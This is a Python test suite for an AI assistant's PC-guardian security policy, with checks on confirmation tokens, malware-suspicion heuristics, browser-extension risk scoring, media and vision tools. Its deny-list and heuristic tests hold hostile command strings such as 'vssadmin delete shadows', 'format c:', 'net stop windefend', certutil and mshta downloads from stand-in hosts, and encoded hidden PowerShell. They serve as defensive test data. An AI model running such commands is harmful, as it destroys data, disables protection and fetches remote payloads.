"""Тесты v2.9: страж ПК (политика безопасности), чтение страницы, медиа, расширения, зрение.

Запуск:  python tests/test_guardian_browser.py
"""
from __future__ import annotations

import asyncio
import json
import os
import sys
import tempfile
import time

TMP = tempfile.mkdtemp(prefix="flux2-guard-")
os.environ["FLUX2_HOME"] = TMP
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from app import events, vision                              # noqa: E402
from app.config import CONFIG                               # noqa: E402
from app.guard_policy import (POLICY, TIER_CONFIRM, TIER_DENY, TIER_READ)  # noqa: E402
from app.tools import REG                                   # noqa: E402
from app.tools import exts, guardian, media, page           # noqa: E402

PASS, FAIL = [], []


def check(name, cond, detail=""):
    (PASS if cond else FAIL).append(name)
    print(f"  {'OK ' if cond else 'FAIL'} {name}" + (f"  <- {detail}" if detail and not cond else ""))


# ============================================================ 1. запретный список
def test_deny_list():
    print("\n[1] ЗАПРЕТНЫЙ СПИСОК — не выполняется ни в каком режиме")
    CONFIG.settings["guard_mode"] = "confirm"

    cases = [
        # (действие, цель, почему нельзя)
        ("process_kill", "MsMpEng.exe", "Defender"),
        ("process_kill", "windefend", "служба Defender"),
        ("process_kill", "mbamservice", "Malwarebytes"),
        ("process_kill", "avp.exe", "Kaspersky"),
        ("process_kill", "SecurityHealthService.exe", "центр безопасности"),
        ("process_kill", "sense.exe", "Defender for Endpoint"),
        ("block_launch", "msmpeng.exe", "нельзя блокировать АВ"),
        ("block_launch", r"C:\Windows\System32\svchost.exe", "системный образ"),
        ("quarantine", r"C:\Windows\System32\kernel32.dll", "системный каталог"),
        ("quarantine", r"c:/windows/system32/drivers/etc/hosts", "системный каталог"),
        ("file_delete", r"C:\Users\vasya\file.exe", "удаление запрещено в принципе"),
        ("autostart_remove", r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell",
         "критичный ключ Winlogon"),
        ("autostart_remove", r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit",
         "критичный ключ Winlogon"),
        ("service_disable", "WinDefend", "служба защиты"),
        ("service_stop", "mpssvc", "брандмауэр"),
    ]
    for action, target, why in cases:
        d = POLICY.classify(action, target)
        check(f"{action}(«{target}») -> DENY  [{why}]",
              (not d.allowed) and d.tier == TIER_DENY, f"tier={d.tier} allowed={d.allowed}")

    # команды, ломающие систему необратимо
    for cmd in ["format c:", "diskpart", "vssadmin delete shadows", "bcdedit /set safeboot",
                "shutdown /s /t 0", "cipher /w:c:", "reg unload hklm\\sam",
                "net stop windefend", "certutil -urlcache -f http://x/a.exe"]:
        d = POLICY.classify("shell", cmd)
        check(f"команда «{cmd}» -> DENY", (not d.allowed) and d.tier == TIER_DENY,
              f"tier={d.tier}")

    # АСИММЕТРИЯ: снимать блокировки можно, устанавливать — нельзя никогда
    d = POLICY.classify("set_policy", r"HKCU\...\Policies\System\DisableTaskMgr=1")
    check("УСТАНОВИТЬ DisableTaskMgr -> DENY (асимметрия)", (not d.allowed) and d.tier == TIER_DENY)
    d = POLICY.classify("policy_restore", "taskmgr:DisableTaskMgr")
    check("СНЯТЬ DisableTaskMgr -> разрешено с подтверждением",
          d.tier == TIER_CONFIRM, f"tier={d.tier}")

    # даже в режиме auto запретный список действует
    CONFIG.settings["guard_mode"] = "auto"
    d = POLICY.classify("process_kill", "MsMpEng.exe")
    check("в режиме auto Defender всё равно защищён", (not d.allowed) and d.tier == TIER_DENY)
    d = POLICY.classify("file_delete", r"C:\x\y.exe")
    check("в режиме auto удаление всё равно запрещено", (not d.allowed) and d.tier == TIER_DENY)
    d = POLICY.classify("quarantine", r"C:\Users\vasya\AppData\Local\Temp\svchost.exe")
    check("в режиме auto карантин обычного файла разрешён без токена", d.allowed)
    CONFIG.settings["guard_mode"] = "confirm"


# ============================================================ 2. подтверждение
def test_confirm_flow():
    print("\n[2] Подтверждение пользователя: одноразовый токен, привязка к действию, TTL")
    CONFIG.settings["guard_mode"] = "confirm"
    loop = asyncio.new_event_loop()

    async def sub():
        return await events.EVENTS.subscribe()
    q = loop.run_until_complete(sub())

    d = POLICY.classify("process_kill", "svchost-suspicious.exe")
    check("привилегированное действие БЕЗ токена не проходит", not d.allowed)
    check("но и не запрещено — ждёт подтверждения", d.tier == TIER_CONFIRM)
    check("выдан id запроса", bool(d.request_id), d.request_id)
    rid = d.request_id

    loop.run_until_complete(asyncio.sleep(0.05))
    evs = []
    while True:
        try:
            evs.append(q.get_nowait())
        except asyncio.QueueEmpty:
            break
    check("в окно ушло событие guard_confirm",
          any(e.get("type") == "guard_confirm" and e.get("id") == rid for e in evs),
          str([e.get("type") for e in evs]))

    # токен ещё не одобрен
    d2 = POLICY.consume(rid, "process_kill", "svchost-suspicious.exe")
    check("неодобренный токен не работает", not d2.allowed)

    res = POLICY.approve(rid, True)
    check("approve вернул ok", res.get("ok") is True, str(res))
    check("approve вернул токен", res.get("token") == rid)

    d3 = POLICY.consume(rid, "process_kill", "svchost-suspicious.exe")
    check("одобренный токен пропускает действие", d3.allowed, d3.reason)
    d4 = POLICY.consume(rid, "process_kill", "svchost-suspicious.exe")
    check("токен ОДНОРАЗОВЫЙ — второй вызов не проходит", not d4.allowed, d4.reason)

    # привязка к паре (действие, цель)
    d = POLICY.classify("quarantine", r"C:\Users\v\tmp\a.exe")
    rid2 = d.request_id
    POLICY.approve(rid2, True)
    d5 = POLICY.consume(rid2, "process_kill", r"C:\Users\v\tmp\a.exe")
    check("токен нельзя применить к другому действию", not d5.allowed, d5.reason)
    d6 = POLICY.consume(rid2, "quarantine", r"C:\Users\v\tmp\OTHER.exe")
    check("токен нельзя применить к другой цели", not d6.allowed, d6.reason)

    # запрет
    d = POLICY.classify("block_launch", "someapp.exe")
    rid3 = d.request_id
    r = POLICY.approve(rid3, False)
    check("reject отмечается", r.get("ok") and r.get("approved") is False)
    d7 = POLICY.consume(rid3, "block_launch", "someapp.exe")
    check("после запрета токен не выдаётся", not d7.allowed)

    # неизвестный/просроченный
    check("чужой токен отклоняется", not POLICY.consume("нет-такого", "quarantine", "x").allowed)
    d = POLICY.classify("quarantine", r"C:\Users\v\tmp\b.exe")
    POLICY.pending[d.request_id].expires = time.time() - 1
    check("просроченный запрос отклоняется", not POLICY.consume(d.request_id, "quarantine",
                                                               r"C:\Users\v\tmp\b.exe").allowed)

    # режим off: чтение остаётся, привилегии гасятся
    CONFIG.settings["guard_mode"] = "off"
    check("off: чтение разрешено", POLICY.classify("autostart_list", "").allowed)
    d = POLICY.classify("process_kill", "notepad.exe")
    check("off: привилегированное действие запрещено", not d.allowed and d.tier == TIER_DENY)
    CONFIG.settings["guard_mode"] = "confirm"

    # аудит пишется
    aud = POLICY.read_audit(50)
    check("аудит-лог ведётся", len(aud) > 5, str(len(aud)))
    check("в аудите есть DENY", any(a["decision"] == "DENY" for a in aud))
    check("в аудите есть APPROVED", any(a["decision"] == "APPROVED" for a in aud))
    check("в аудите есть REJECTED", any(a["decision"] == "REJECTED" for a in aud))
    check("в аудите есть время и пользователь",
          all("time" in a and "action" in a and "decision" in a for a in aud))
    events.EVENTS.unsubscribe(q)
    loop.close()


# ============================================================ 3. эвристики
def test_suspicion():
    print("\n[3] Эвристики подозрительности")
    bad = [
        r"C:\Users\v\AppData\Local\Temp\svchost.exe",
        r'powershell -w hidden -enc SQBFAFgA',
        r"C:\Users\Public\update.exe",
        r"mshta http://evil/x.hta",
        r"rundll32.exe javascript:eval(1)",
        r"certutil -urlcache -split -f http://x/a.exe",
        r"C:\Windows\Temp\qwertyuiopasdfghjklz.exe",
    ]
    for cmd in bad:
        flags = guardian._suspicion(cmd, guardian._exe_from_cmd(cmd))
        check(f"помечено: {cmd[:58]}", len(flags) > 0, str(flags))
    good = [
        r'"C:\Program Files\Google\Chrome\Application\chrome.exe" --profile',
        r"C:\Windows\System32\ctfmon.exe",
        r'"C:\Program Files\Telegram Desktop\Telegram.exe"',
    ]
    for cmd in good:
        flags = guardian._suspicion(cmd, guardian._exe_from_cmd(cmd))
        check(f"НЕ помечено: {cmd[:58]}", len(flags) == 0, str(flags))
    check("_exe_from_cmd разбирает путь в кавычках",
          guardian._exe_from_cmd(r'"C:\a b\c.exe" -x') == r"C:\a b\c.exe")


# ============================================================ 4. расширения
def make_fake_profile(root: str) -> None:
    """Собираем поддельный профиль Chrome с тремя расширениями."""
    import pathlib

    def ext(eid: str, ver: str, mf: dict, locales: dict | None = None):
        d = pathlib.Path(root) / "Default" / "Extensions" / eid / ver
        d.mkdir(parents=True, exist_ok=True)
        (d / "manifest.json").write_text(json.dumps(mf), encoding="utf-8")
        if locales:
            for loc, msgs in locales.items():
                ld = d / "_locales" / loc
                ld.mkdir(parents=True, exist_ok=True)
                (ld / "messages.json").write_text(json.dumps(msgs), encoding="utf-8")

    ext("a" * 32, "1.0", {
        "manifest_version": 3, "name": "__MSG_name__", "default_locale": "ru",
        "description": "Безобидное расширение",
        "permissions": ["storage", "activeTab"], "action": {"default_popup": "popup.html"},
    }, locales={"ru": {"name": {"message": "Тестовое расширение"}}})

    ext("b" * 32, "2.1", {
        "manifest_version": 3, "name": "SpyAddOn", "description": "Шпион",
        "permissions": ["cookies", "history", "webRequest", "nativeMessaging", "debugger"],
        "host_permissions": ["<all_urls>"],
        "background": {"service_worker": "bg.js"},
    })

    ext("c" * 32, "0.9", {
        "manifest_version": 2, "name": "OldMV2", "description": "Старое",
        "permissions": ["tabs", "https://*/*", "http://*/*"],
        "browser_action": {"default_popup": "pop.html"},
        "options_page": "opt.html",
        "background": {"scripts": ["bg.js"]},
    })


def test_extensions():
    print("\n[4] Инвентаризация расширений браузера")
    root = os.path.join(TMP, "chrome-profile")
    make_fake_profile(root)
    old = dict(exts.BROWSERS)
    key = {"win32": "win", "darwin": "mac"}.get(sys.platform, "linux")
    for b in list(exts.BROWSERS):
        exts.BROWSERS[b] = dict(exts.BROWSERS[b])
        exts.BROWSERS[b][key] = root if b == "chrome" else ""
    try:
        found = exts.scan_extensions()
    finally:
        exts.BROWSERS.clear()
        exts.BROWSERS.update(old)

    names = {e["name"] for e in found}
    check("найдены все три расширения", len(found) == 3, str([e["name"] for e in found]))
    check("__MSG_name__ разрешён через _locales", "Тестовое расширение" in names, str(names))
    by = {e["name"]: e for e in found}

    safe = by.get("Тестовое расширение") or {}
    check("безобидное расширение: риск 0", safe.get("risk", 9) == 0, str(safe.get("risk")))
    check("popup прочитан из manifest", safe.get("popup") == "popup.html")

    spy = by.get("SpyAddOn") or {}
    check("шпионское расширение: максимальный риск 3", spy.get("risk") == 3, str(spy.get("risk")))
    notes = " ".join(spy.get("risk_notes") or [])
    for need in ("cookies", "<all_urls>", "debugger", "nativeMessaging"):
        check(f"  в отчёте отмечено {need}", need in notes, notes[:200])

    mv2 = by.get("OldMV2") or {}
    check("MV2: хосты вынуты из permissions",
          any("://" in h for h in (mv2.get("hosts") or [])), str(mv2.get("hosts")))
    check("MV2: в permissions хостов не осталось",
          not any("://" in p for p in (mv2.get("permissions") or [])), str(mv2.get("permissions")))
    check("MV2: options_page прочитан", mv2.get("options") == "opt.html")
    check("MV2 background помечен", any("MV2 background" in n for n in (mv2.get("risk_notes") or [])))

    txt = exts._fmt(spy, True)
    check("_fmt рисует флаг риска", "🔴" in txt, txt[:80])
    check("_fmt показывает id", "b" * 32 in txt)

    # тулзы
    for n in ("ext_list", "ext_find", "ext_open", "ext_shortcuts", "ext_risk_report"):
        check(f"тулз зарегистрирован: {n}", n in REG.tools)
    r = REG.tools["ext_shortcuts"].handler(ctx={}, browser="")
    check("ext_shortcuts не падает без профилей", isinstance(r, str) and len(r) > 10, str(r)[:120])


# ============================================================ 5. зрение
def test_vision():
    print("\n[5] Зрение: картинки реально доходят до модели")
    from app.tools import screen as SCR
    w, h = 64, 40
    buf = bytes((i * 7 % 256) for i in range(w * h * 4))
    path = os.path.join(TMP, "shot.png")
    SCR.save_png(path, w, h, buf)
    prep = vision.prepare(path)
    check("prepare вернул данные", bool(prep))
    if prep:
        check("mime = image/jpeg (перекодировали)", prep["mime"] == "image/jpeg", prep["mime"])
        check("base64 декодируется в JPEG", prep["b64"][:4] == "/9j/", prep["b64"][:8])
        check("размер вменяемый", 0 < prep["bytes"] < 200000, str(prep["bytes"]))
        part = vision.image_part(prep)
        check("part формата OpenAI", part["type"] == "image_url"
              and part["image_url"]["url"].startswith("data:image/jpeg;base64,"))

    big = os.path.join(TMP, "big.png")
    SCR.save_png(big, 3000, 200, bytes(3000 * 200 * 4))
    CONFIG.settings["vision_max_px"] = 800
    p2 = vision.prepare(big)
    if p2:
        import base64, io
        from PIL import Image
        im = Image.open(io.BytesIO(base64.b64decode(p2["b64"])))
        check(f"ресайз до vision_max_px (800): {im.size}", max(im.size) <= 800, str(im.size))
    CONFIG.settings["vision_max_px"] = 1568

    msg = vision.build_user_message([path, big, "/нет/такого.png"])
    check("build_user_message: role=user", msg and msg["role"] == "user")
    check("пропущен несуществующий файл", msg and len(msg["content"]) == 3,
          str(len(msg["content"])) if msg else None)
    check("первый part — текстовая подводка", msg["content"][0]["type"] == "text")
    check("остальные — картинки", all(p["type"] == "image_url" for p in msg["content"][1:]))
    check("лимит max_images уважается",
          len(vision.build_user_message([path] * 9)["content"]) - 1
          == int(CONFIG.settings.get("vision_max_images") or 3))
    check("пустой список -> None", vision.build_user_message([]) is None)
    check("vision_enabled(auto) для gpt-4o", vision.vision_enabled({}, "gpt-4o"))
    check("vision_enabled(auto) для text-embedding-3", not vision.vision_enabled({}, "text-embedding-3-small"))
    CONFIG.settings["vision_mode"] = "off"
    check("vision_mode=off глушит всё", not vision.vision_enabled({}, "gpt-4o"))
    CONFIG.settings["vision_mode"] = "on"
    check("vision_mode=on включает всё", vision.vision_enabled({}, "text-embedding-3-small"))
    CONFIG.settings["vision_mode"] = "auto"
    check("явный флаг подключения переопределяет auto",
          not vision.vision_enabled({"vision": False}, "gpt-4o"))
    check("describe_capability не падает", "vision=" in vision.describe_capability({}, "gpt-4o"))


# ============================================================ 6. карта страницы
def test_page_tools():
    print("\n[6] Карта страницы и медиа-тулзы")
    for n in ("browser_page_snapshot", "browser_act", "browser_act_text", "browser_scroll_find",
              "browser_page_media_state", "browser_media_control",
              "media_status", "media_control", "media_open_service", "music_play",
              "music_player_control", "music_library", "media_info"):
        check(f"тулз зарегистрирован: {n}", n in REG.tools)

    js = page._snap_js()
    check("в снапшот подставлен лимит элементов", "__MAX__" not in js and "220" in js)
    check("shadow DOM обходится", "__SHADOW__" not in js and "shadowRoot" in js)
    check("элементы складываются в window.__fluxEls", "__fluxEls" in js)

    spec = REG.tools["browser_act"]
    names = [p.name for p in spec.params]
    for need in ("index", "action", "text", "key", "tab", "real_click"):
        check(f"  browser_act параметр {need}", need in names)
    acts = next(p.enum for p in spec.params if p.name == "action")
    for a in ("click", "type", "append", "clear", "select", "press", "focus", "hover", "media"):
        check(f"  действие {a} поддержано", a in acts)

    snap = {"title": "MrMarmok - YouTube", "url": "https://youtube.com/@mrmarmok/videos",
            "scroll": {"y": 0, "max": 2400}, "viewport": {"w": 1280, "h": 720},
            "counts": {"elements": 3, "scanned": 900, "truncated": False, "text": 12000},
            "headings": ["h1: MrMarmok", "h2: Видео"],
            "media": [{"tag": "video", "paused": True, "ended": False, "muted": False,
                       "volume": 100, "t": 0, "dur": 620, "rate": 1, "ready": 4,
                       "src": "https://rr1.youtube.com/x.mp4", "w": 1280, "h": 720}],
            "mediaSession": {"state": "paused", "title": "Охота на Разумных", "artist": ""},
            "items": [
                {"i": 1, "tag": "a", "role": "link", "type": "",
                 "text": "Охота на Разумных Животных", "href": "/watch?v=abc",
                 "vis": True, "y": 420, "x": 30, "w": 300, "h": 170},
                {"i": 2, "tag": "button", "role": "button", "type": "", "text": "Пауза",
                 "href": "", "vis": True, "y": 600, "x": 640, "w": 40, "h": 40},
                {"i": 3, "tag": "input", "role": "input", "type": "search", "text": "",
                 "href": "", "vis": False, "y": 10, "x": 10, "w": 200, "h": 30,
                 "value": "", "ph": "Введите запрос"},
            ]}
    txt = page._fmt_snapshot(snap, 120)
    check("в карте есть заголовок страницы", "MrMarmok" in txt, txt[:200])
    check("нумерация элементов [1] [2] [3]",
          all(f"[{i}]" in txt for i in (1, 2, 3)))
    check("текст кнопки виден модели", '"Пауза"' in txt)
    check("href ссылки виден", "/watch?v=abc" in txt)
    check("placeholder поля виден", "Введите запрос" in txt)
    check("элемент вне экрана помечен", "вне экрана" in txt)
    check("состояние плеера видно", "ПАУЗА" in txt and "620с" in txt)
    check("медиа-сессия ОС видна", "Охота на Разумных" in txt)
    check("позиция прокрутки видна", "0/2400" in txt)
    check("подсказка чем жать", "browser_act(index=N)" in txt)
    cut = page._fmt_snapshot(snap, 2)
    check("limit=2 не показывает элемент [3]", "[3]" not in cut and "[1]" in cut and "[2]" in cut,
          cut[-300:])
    check("limit=2 сообщает, сколько скрыто", "и ещё 1" in cut, cut[-200:])
    empty = page._fmt_snapshot({"title": "x", "url": "y", "counts": {}, "items": []}, 10)
    check("пустая страница даёт понятный ответ", "НЕ НАЙДЕНО" in empty, empty)


# ============================================================ 7. медиа
def test_media():
    print("\n[7] Медиа-подсистема")
    lib_dir = os.path.join(TMP, "music")
    os.makedirs(os.path.join(lib_dir, "Альбом"), exist_ok=True)
    for fn in ("track one.mp3", "track two.mp3", "notes.txt"):
        with open(os.path.join(lib_dir, "Альбом", fn), "wb") as f:
            f.write(b"\x00" * 2048)
    CONFIG.settings["music_dir"] = lib_dir
    lib = media.scan_library()
    check("фонотека нашла только аудио", len(lib) == 2, str([t["name"] for t in lib]))
    check("в записи есть путь и имя", all(t.get("path") and t.get("name") for t in lib))

    r = REG.tools["music_library"].handler(ctx={}, filter="one", limit=10)
    check("music_library фильтрует", "track one" in r and "track two" not in r, r[:120])

    r = REG.tools["music_play"].handler(ctx={}, query="two", loop=True, shuffle=False, limit=10)
    check("music_play запускает трек", r.ok and "track two" in r.text, r.text[:200])
    check("music_play помечает повтор", "зациклено" in r.text, r.text[:200])

    r = REG.tools["music_play"].handler(ctx={}, query="нет такого трека", loop=False,
                                        shuffle=False, limit=10)
    check("music_play по несуществующему — ошибка со списком", not r.ok and "Что есть" in r.text,
          r.text[:200])

    CONFIG.settings["music_dir"] = os.path.join(TMP, "пусто")
    os.makedirs(CONFIG.settings["music_dir"], exist_ok=True)
    r = REG.tools["music_play"].handler(ctx={}, query="", loop=False, shuffle=False, limit=10)
    check("пустая фонотека — понятная подсказка", not r.ok and "media_open_service" in r.text,
          r.text[:200])
    CONFIG.settings["music_dir"] = lib_dir

    check("SERVICES содержит youtube", "youtube" in media.SERVICES)
    check("SERVICES содержит yandex", "yandex" in media.SERVICES)
    check("SERVICES содержит vk", "vk" in media.SERVICES)
    for k, v in media.SERVICES.items():
        check(f"  {k}: search содержит {{q}}", "{q}" in v["search"], v["search"])

    check("send_media_key на чужой ОС не падает",
          isinstance(media.send_media_key("play_pause"), bool))
    check("system_volume не падает", isinstance(media.system_volume(delta=10), dict))
    check("gsmtcs на чужой ОС честно говорит", media.gsmtcs("status").get("ok") is False
          if sys.platform != "win32" else True)
    r = REG.tools["media_info"].handler(ctx={})
    d = json.loads(r)
    check("media_info отдаёт диагностику", "music_dir" in d and "services" in d, str(d)[:200])


# ============================================================ 8. страж: тулзы
def test_guardian_tools():
    print("\n[8] Тулзы стража ПК")
    for n in ("guard_autostart_list", "guard_policy_status", "guard_policy_restore",
              "guard_process_list", "guard_process_kill", "guard_file_quarantine",
              "guard_file_restore", "guard_quarantine_list", "guard_block_launch",
              "guard_unblock_launch", "guard_autostart_remove", "guard_report",
              "guard_audit_log"):
        check(f"тулз зарегистрирован: {n}", n in REG.tools)
        sp = REG.tools[n].schema()["function"]["parameters"]
        if n in ("guard_process_kill", "guard_file_quarantine", "guard_policy_restore",
                 "guard_block_launch", "guard_unblock_launch", "guard_autostart_remove",
                 "guard_file_restore"):
            check(f"  {n}: есть параметр confirm_token", "confirm_token" in sp["properties"])

    # чтение работает без подтверждения
    r = REG.tools["guard_process_list"].handler(ctx={}, filter="", suspicious_only=False, limit=5)
    check("guard_process_list читает процессы (Linux: ps)", isinstance(r, str) and "процессов" in r,
          str(r)[:150])
    r = REG.tools["guard_autostart_list"].handler(ctx={}, source="all", suspicious_only=False,
                                                 limit=20)
    check("guard_autostart_list не падает на Linux", isinstance(r, str) and len(r) > 5, str(r)[:150])
    r = REG.tools["guard_policy_status"].handler(ctx={})
    check("guard_policy_status отвечает на любой ОС", hasattr(r, "text"), str(r)[:120])

    # карантин: файл реально переносится и возвращается
    victim = os.path.join(TMP, "evil.exe")
    with open(victim, "wb") as f:
        f.write(b"MZ" + b"\x00" * 500)
    r = REG.tools["guard_file_quarantine"].handler(ctx={}, path=victim, reason="тест",
                                                  confirm_token="")
    check("карантин БЕЗ токена требует подтверждения", not r.ok and "ПОДТВЕРЖДЕНИЯ" in r.text,
          r.text[:200])
    check("файл при этом НЕ тронут", os.path.exists(victim))
    tok = (r.data or {}).get("need_confirm")
    check("вернулся id запроса подтверждения", bool(tok), str(r.data))
    apr = POLICY.approve(tok, True)
    check("запрос одобрен", apr.get("ok") and apr.get("approved"), str(apr))
    r = REG.tools["guard_file_quarantine"].handler(ctx={}, path=victim, reason="тест",
                                                  confirm_token=tok)
    check("с токеном карантин сработал", r.ok, r.text[:200])
    check("файл уехал из исходной точки", not os.path.exists(victim))
    qpath = (r.data or {}).get("quarantined")
    check("файл лежит в карантине", bool(qpath) and os.path.exists(qpath), str(qpath))
    check("посчитан sha256", len((r.data or {}).get("sha256", "")) == 64,
          str((r.data or {}).get("sha256"))[:80])
    check("журнал карантина ведётся",
          os.path.exists(os.path.join(guardian.quarantine_dir(), "journal.jsonl")))

    jr = REG.tools["guard_quarantine_list"].handler(ctx={})
    check("guard_quarantine_list показывает запись", "evil.exe" in jr, jr[:150])

    tok2 = POLICY.classify("file_restore", qpath).request_id
    POLICY.approve(tok2, True)
    r = REG.tools["guard_file_restore"].handler(ctx={}, path=qpath, confirm_token=tok2)
    check("файл вернулся из карантина", r.ok and os.path.exists(victim), r.text[:200])

    # карантин системного файла запрещён даже с токеном
    d = POLICY.classify("quarantine", r"C:\Windows\System32\winlogon.exe")
    check("системный файл в карантин не пускает", d.tier == TIER_DENY)

    # отчёт и аудит
    r = REG.tools["guard_report"].handler(ctx={}, deep=False)
    check("guard_report собирается", isinstance(r, str) and "РЕЖИМ ПОЛИТИКИ" in r, str(r)[:150])
    r = REG.tools["guard_audit_log"].handler(ctx={}, limit=10, filter="")
    check("guard_audit_log показывает записи", isinstance(r, str) and len(r) > 20, str(r)[:150])


# ============================================================ 9. неблокирующий dispatch
def test_dispatch_threaded():
    print("\n[9] Синхронные тулзы больше не вешают event loop")

    @REG.tool("_test_blocker", "тестовый блокирующий тулз", [], "test")
    def _blocker(ctx):
        time.sleep(0.6)
        return "проснулся"

    async def scenario():
        t0 = time.time()
        ticks = 0

        async def ticker():
            nonlocal ticks
            while time.time() - t0 < 1.2:
                ticks += 1
                await asyncio.sleep(0.02)

        task = asyncio.create_task(ticker())
        r = await REG.dispatch("_test_blocker", {}, {})
        await task
        return r, ticks

    loop = asyncio.new_event_loop()
    r, ticks = loop.run_until_complete(scenario())
    loop.close()
    check("блокирующий тулз отработал", r.ok and r.text == "проснулся", r.text)
    check("event loop продолжал тикать во время блокировки", ticks > 15, str(ticks))
    REG.tools.pop("_test_blocker", None)
    REG._docs.pop("_test_blocker", None)


# ============================================================ 10. целостность
def test_registry():
    print("\n[10] Целостность реестра")
    cats = REG.categories()
    total = sum(cats.values())
    check("нет дубликатов имён", len(REG.tools) == total, f"{len(REG.tools)} vs {total}")
    for c in ("page", "media", "extensions", "guardian"):
        check(f"категория {c} непустая", cats.get(c, 0) >= 4, str(cats.get(c)))
    for name, spec in REG.tools.items():
        sch = spec.schema()
        assert sch["function"]["name"] == name, name
        props = sch["function"]["parameters"]["properties"]
        for req in sch["function"]["parameters"]["required"]:
            assert req in props, f"{name}: {req}"
        for pn, pv in props.items():
            assert pv.get("type") in ("string", "integer", "number", "boolean", "array", "object"), \
                f"{name}.{pn}: {pv.get('type')}"
            if "enum" in pv:
                assert isinstance(pv["enum"], list) and pv["enum"], f"{name}.{pn}: пустой enum"
    check(f"все {total} схем валидны", True)

    hits = [s.name for s in REG.search("поставь музыку на паузу в ютубе", k=10)]
    check("retrieval: «поставь музыку на паузу» -> media_control",
          "media_control" in hits or "browser_media_control" in hits, str(hits))
    hits = [s.name for s in REG.search("что в автозапуске вирус", k=10)]
    check("retrieval: «что в автозапуске» -> guard_autostart_list",
          "guard_autostart_list" in hits, str(hits))
    hits = [s.name for s in REG.search("нажми кнопку на странице сайта", k=10)]
    check("retrieval: «нажми кнопку на странице» -> browser_act",
          "browser_act" in hits or "browser_act_text" in hits, str(hits))
    hits = [s.name for s in REG.search("какие расширения браузера установлены", k=10)]
    check("retrieval: «расширения браузера» -> ext_list", "ext_list" in hits, str(hits))


if __name__ == "__main__":
    print(f"FLUX 2.0 — тесты стража ПК, страницы, медиа, расширений, зрения  ({TMP})")
    t0 = time.time()
    for fn in (test_deny_list, test_confirm_flow, test_suspicion, test_extensions,
               test_vision, test_page_tools, test_media, test_guardian_tools,
               test_dispatch_threaded, test_registry):
        fn()
    print(f"\n{'='*64}\nИТОГО: {len(PASS)} OK, {len(FAIL)} FAIL   ({time.time()-t0:.1f}с)")
    if FAIL:
        print("Провалено:")
        for f in FAIL:
            print("  -", f)
    sys.exit(1 if FAIL else 0)
